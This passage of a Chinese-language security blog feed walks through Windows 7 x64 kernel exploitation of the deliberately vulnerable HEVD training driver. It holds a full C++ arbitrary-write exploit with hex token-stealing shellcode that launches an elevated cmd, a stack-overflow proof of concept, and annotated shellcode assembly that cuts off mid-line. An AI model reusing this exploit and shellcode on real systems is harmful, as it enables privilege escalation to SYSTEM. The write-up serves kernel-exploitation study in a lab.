class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">default</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Module Count: &quot;</span> &lt;&lt; PModuleInfo-&gt;ModulesCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    INT32 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (i &lt; PModuleInfo-&gt;ModulesCount)    &#123;        SYSTEM_MODULE CurrentSM = PModuleInfo-&gt;Modules[i];        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Log System Module:&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved1 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved1 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved2 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved2 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageBaseAddress 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageBaseAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageSize 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageSize &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Flags 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Flags &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Id 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Id &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Rank 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Rank &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- LoadCount 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.LoadCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- NameOffset 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.NameOffset &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Name &quot;</span> &lt;&lt; CurrentSM.Name &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntoskrnl&quot;</span>) || <span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntkrnl&quot;</span>))        &#123;            <span class="hljs-keyword">return</span> CurrentSM;        &#125;        i += <span class="hljs-number">1</span>;    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Can not find&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);&#125;<span class="hljs-function">ULONG64 <span class="hljs-title">GetHalDispatchTableAddress</span><span class="hljs-params">(SYSTEM_MODULE SM)</span></span><span class="hljs-function"></span>&#123;    CHAR NtName[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;    <span class="hljs-built_in">strncpy</span>(NtName, <span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>));    HMODULE hNtkrnl = LoadLibraryA(NtName);    <span class="hljs-keyword">if</span> (hNtkrnl == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open &quot;</span> &lt;&lt; NtName &lt;&lt; <span class="hljs-string">&quot; Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    ULONG64 userlandHal = (ULONG64)GetProcAddress(hNtkrnl, <span class="hljs-string">&quot;HalDispatchTable&quot;</span>);    ULONG64 kernelHal = userlandHal - (ULONG64)hNtkrnl + SM.ImageBaseAddress;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] HalDispatchTable: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; kernelHal &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    HalDispatchTable:</span><span class="hljs-comment">    1: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 fffff800`044148e8</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment"></span><span class="hljs-comment">    1: kd&gt; uf fffff800`044148e8</span><span class="hljs-comment">    hal!HaliQuerySystemInformation:</span><span class="hljs-comment">    fffff800`044148e8 fff3            push    rbx</span><span class="hljs-comment">    fffff800`044148ea 55              push    rbp</span><span class="hljs-comment">    fffff800`044148eb 56              push    rsi</span><span class="hljs-comment">    fffff800`044148ec 57              push    rdi</span><span class="hljs-comment">    fffff800`044148ed 4154            push    r12</span><span class="hljs-comment">    */</span>    <span class="hljs-keyword">return</span> kernelHal;&#125;<span class="hljs-function">VOID <span class="hljs-title">TriggerShellcode</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; uf NtQueryIntervalProfile</span><span class="hljs-comment">    ntdll!NtQueryIntervalProfile:</span><span class="hljs-comment">    00000000`77b7aa80 4c8bd1          mov     r10,rcx</span><span class="hljs-comment">    00000000`77b7aa83 b81d010000      mov     eax,11Dh</span><span class="hljs-comment">    00000000`77b7aa88 0f05            syscall</span><span class="hljs-comment">    00000000`77b7aa8a c3              ret</span><span class="hljs-comment">    0: kd&gt; uf nt!NtQueryIntervalProfile</span><span class="hljs-comment">    nt!NtQueryIntervalProfile:</span><span class="hljs-comment">    fffff800`041b7940 48895c2408      mov     qword ptr [rsp+8],rbx</span><span class="hljs-comment">    fffff800`041b7945 57              push    rdi</span><span class="hljs-comment">    fffff800`041b7946 4883ec20        sub     rsp,20h</span><span class="hljs-comment">    fffff800`041b794a 488bda          mov     rbx,rdx</span><span class="hljs-comment">    */</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    PNtQueryIntervalProfile NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtQueryIntervalProfile&quot;</span>);    PULONG null = <span class="hljs-number">0</span>;    NtQueryIntervalProfile(<span class="hljs-number">2</span>, &amp;null);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open HackSysExtremeVulnerableDriver Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Device Handle: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; dev &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    SYSTEM_MODULE KBSM = GetKernelBaseSystemModule();    ULONG64 HalDispatchTable = GetHalDispatchTableAddress(KBSM);    CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret: return to func KeQueryIntervalProfile </span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] VirtualAlloc failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    ULONG64* ptrShellcode = (ULONG64 *)&amp;addr;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] shecllode addr: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; addr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG64 chBuffer[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;;    chBuffer[<span class="hljs-number">0</span>] = (ULONG64)ptrShellcode;    chBuffer[<span class="hljs-number">1</span>] = (ULONG64)(HalDispatchTable + <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    DeviceIoControl(dev, <span class="hljs-number">0x22200B</span>, chBuffer, <span class="hljs-number">0x10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 00000000`000e0000</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment">    */</span>    CloseHandle(dev);    TriggerShellcode();    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/</a><br><a href="https://h0mbre.github.io/HEVD_AbitraryWrite_64bit">https://h0mbre.github.io/HEVD_AbitraryWrite_64bit</a><br><a href="https://www.anquanke.com/post/id/246289">https://www.anquanke.com/post/id/246289</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 stack overflow</title>
    <link href="/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/"/>
    <url>/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/</url>
    
    <content type="html"><![CDATA[<p>尝试学点新东西，应该算是很久没学了</p><pre><code class="hljs nsis">环境：虚拟机：<span class="hljs-literal">Win7</span> SP1 x64物理机：<span class="hljs-literal">Win10</span>debugger：windbg previewcompiler：vs2022</code></pre><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="VirtualKD-Redux"><a href="#VirtualKD-Redux" class="headerlink" title="VirtualKD-Redux"></a>VirtualKD-Redux</h3><p>看了很多博客，以及尝试搭建环境，最后发现还是别人写的轮子好用</p><p><a href="https://github.com/4d61726b/VirtualKD-Redux">VirtualKD-Redux</a></p><p>下载之后，解压，把<code>target64</code>文件夹放到虚拟机中，然后在虚拟机运行<code>vminstall.exe</code>即可</p><p>这个安装所做的事情，如<a href="https://blog.csdn.net/lixiangminghate/article/details/78659646">VirtualKD加速windbg双机调试速度</a>所说</p><p>第一件事情就是添加了一个<code>VirtualKD</code>的启动项</p><p>但是第二件事情，我并没找到存在<code>DDKLaunchMonitor.exe</code>文件以及对注册表修改的行为（这个注册表的行为，可以看到老版本的这个轮子，存在<code>kdpatch.reg</code>），但是我发现<code>kdbazis.dll</code>该文件被放到了<code>C:\Windows\System32</code>目录下，查阅了一些资料，提到<code>kdbazis.dll</code>是由<code>kdvm.dll</code>重命名而来（重命名是因为避免<code>win8</code>以上的操作系统文件名称冲突），其作用就是用于通信，根据运行在主机运行<code>vmmon64.exe</code>的窗口的<code>log</code>可以看到<code>VirtualKD-Redux patcher DLL successfully loaded. Patching the GuestRPC mechanism...</code>，那应该就是对于<code>GuestRPC</code>的机制进行<code>patch</code>，从而便于通信，并且该模式下，可以加载未签名的驱动，即将要加载的<code>HEVD.sys</code></p><p>主机在<code>win7</code>启动时，运行<code>vmmon64</code>进行监控，并启动<code>Run debugger</code></p><h3 id="OSRLOADER"><a href="#OSRLOADER" class="headerlink" title="OSRLOADER"></a>OSRLOADER</h3><p>加载<code>HEVD.sys</code>驱动</p><h3 id="Windbg-Preview"><a href="#Windbg-Preview" class="headerlink" title="Windbg Preview"></a>Windbg Preview</h3><p>需要设置一下<code>_NT_SYMBOL_PATH</code>，为<code>srv*H:\WinSymbols*https://msdl.microsoft.com/download/symbols;</code></p><p>在调试时，可以加载<code>HEVD.pdb</code>便于下断点，以及需要在<code>OSRLOADER</code>中<code>start service</code>才可以看到<code>HEVD</code>驱动</p><p>利用<code>lm m h*</code>指令就可以看到<code>HEVD</code>是否加载了</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>可以通过<code>lm m HEVD</code>看<code>HEVD</code>模块的基础信息，通过<code>!drvobj HEVD 2</code>查看该驱动的详细的信息</p><p>在<code>IrpDeviceIoCtlHandler()</code>接口可以看到各种<code>ioctlhandler</code>，其中栈溢出为<code>0x222003</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x222003</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = BufferOverflowStackIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>漏洞点十分简单，就是裸溢出</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">BufferOverflowStackIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 Options; <span class="hljs-comment">// rdx</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>i64;  Options = IrpSp-&gt;Parameters.Create.Options;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerBufferOverflowStack(Parameters, Options);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerBufferOverflowStack</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *UserBuffer, <span class="hljs-keyword">unsigned</span> __int64 Size)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">2048</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-818h] BYREF</span>  <span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v5));  ProbeForRead(UserBuffer, <span class="hljs-number">0x800</span>ui64, <span class="hljs-number">1u</span>);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v5);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="hljs-number">0x800</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);  memmove(v5, UserBuffer, Size);                <span class="hljs-comment">// stack overflow</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>因此输入字符串覆盖到<code>ret</code>即可触发漏洞</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>首先打开这个设备，然后于这个设备进行交互，通过调试，可以看到最后<code>ret</code>的时候，<code>rip</code>跳转到了<code>0x4141414141414141</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>现在要做的就是提权之后再打开一个<code>cmd</code></p><p>目前第一个栈溢出的实验，是没开<code>SMEP</code>，因此可以直接跳转到用户态的空间执行指令，就可以直接<code>VirtualAlloc</code>一个可读可写可执行的页，从而直接执行提权的指令</p><p>这里是直接参考<a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">[Kernel Exploitation] 2: Payloads</a>的方法，窃取的进程级令牌</p><p>每个<code>windows</code>进程都有一个<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">EPROCESS</a>结构体（<code>PEB</code>存在于用户空间），而这个<code>EPROCESS</code>结构包含一个<code>Token</code>字段，这个字段告诉系统该进程拥有什么权限，因此如果能找到特权进程的<code>Token</code>，将其偷过来，然后放到当前进程的<code>Token</code>上，就可以提权了</p><p>为了找到<code>EPROCESS</code>就需要依赖对下述结构体的了解</p><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>_KPCR</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kpcr.htm">KPCR</a>代表<code>Kernel Processor Control Region</code>，内核为每一个逻辑处理器都维护一个<code>KPCR</code></p><p>可以看到<code>_KPRCB</code>结构体在<code>_KPCR</code>的偏移为<code>0x180</code>的地方</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPCR</span> Prcbntdll!<span class="hljs-variable">_KPCR</span>   +<span class="hljs-number">0</span>x180 Prcb : <span class="hljs-variable">_KPRCB</span></code></pre><p><strong>_KPRCB</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kprcb.htm">_KPRCB</a>代表<code>Kernel Processor Control Block</code>，为<code>KPCR</code>的最后一个字段，拥有内核在管理处理器和管理资源时需要随时访问的大部分内容</p><p>可以看到在偏移为<code>0x8</code>的地方可以拿到当前的线程，因此直接通过 <code>_KPCR+0x188</code> 就可以获取当前内核线程的结构体</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPRCB</span> CurrentThreadntdll!<span class="hljs-variable">_KPRCB</span>   +<span class="hljs-number">0</span>x008 CurrentThread : Ptr64 <span class="hljs-variable">_KTHREAD</span></code></pre><p><strong>_KTHREAD</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kthread/index.htm">KTHREAD</a>是内核内部的线程结构</p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">KPROCESS</a>位于<code>_KTHREAD.ApcState.Process</code>之中</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KTHREAD</span> ApcStatentdll!<span class="hljs-variable">_KTHREAD</span>   +<span class="hljs-number">0</span>x050 ApcState : <span class="hljs-variable">_KAPC_STATE</span></code></pre><p><strong>_KAPC_STATE</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kprocessor_state.htm">_KAPC_STATE</a>是一个较为简单的处理器状态集合</p><p>因此通过<code>_KTHREAD+0x70</code>可以获得<code>_KPROCESS</code></p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KAPC_STATE</span> Processntdll!<span class="hljs-variable">_KAPC_STATE</span>   +<span class="hljs-number">0</span>x020 Process : Ptr64 <span class="hljs-variable">_KPROCESS</span></code></pre><p><strong>_EPROCESS</strong></p><p>根据<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">_EPROCESS</a>和<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">_KPROCESS</a>可知</p><p><code>_EPROCESS</code>的第一项是<code>_KPROCESS</code>，因此找到<code>_KPROCESS</code>的地址，就相当于找到了<code>_EPROCESS</code>的地址，相当于<code>_EPROCESS</code>就是一个大结构体，其中的第一域就是<code>_KPROCESS</code>（P.S. <code>_KTHREAD</code>和<code>_ETHREAD</code>也是类似的）</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>: kd&gt; dt _EPROCESSntdll!_EPROCESS   +<span class="hljs-number">0x000</span> Pcb              : _KPROCESS   +<span class="hljs-number">0x160</span> ProcessLock      : _EX_PUSH_LOCK   +<span class="hljs-number">0x168</span> CreateTime       : _LARGE_INTEGER   +<span class="hljs-number">0x170</span> ExitTime         : _LARGE_INTEGER   +<span class="hljs-number">0x178</span> RundownProtect   : _EX_RUNDOWN_REF   +<span class="hljs-number">0x180</span> UniqueProcessId  : Ptr64 Void   +<span class="hljs-number">0x188</span> ActiveProcessLinks : _LIST_ENTRY   ...   +<span class="hljs-number">0x208</span> Token            : _EX_FAST_REF   ...</code></pre><p>因此需要覆盖的<code>Token</code>就是<code>0x208</code>偏移的域，而可以通过遍历<code>ActiveProcessLinks</code>获取<code>active</code>的进程，且已知系统进程的<code>PID</code>为<code>4</code>，因此就可以遍历<code>0x188</code>的进程链，找到<code>PID == 4</code>的进程，然后取出系统进程的<code>Token</code>，覆盖到当前进程的<code>Token</code>上</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>因此<code>x64</code>的<code>shellocde</code>如下</p><pre><code class="hljs assembly">xor rax, rax                        ; Set ZEROmov rax, [gs:rax + 188h]            ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at GS : [0x188]           mov rax, [rax + 70h]                ; Get nt!_KTHREAD.ApcState.Process     mov rcx, rax                        ; Copy current process _EPROCESS structure  mov r11, rcx                        ; Store 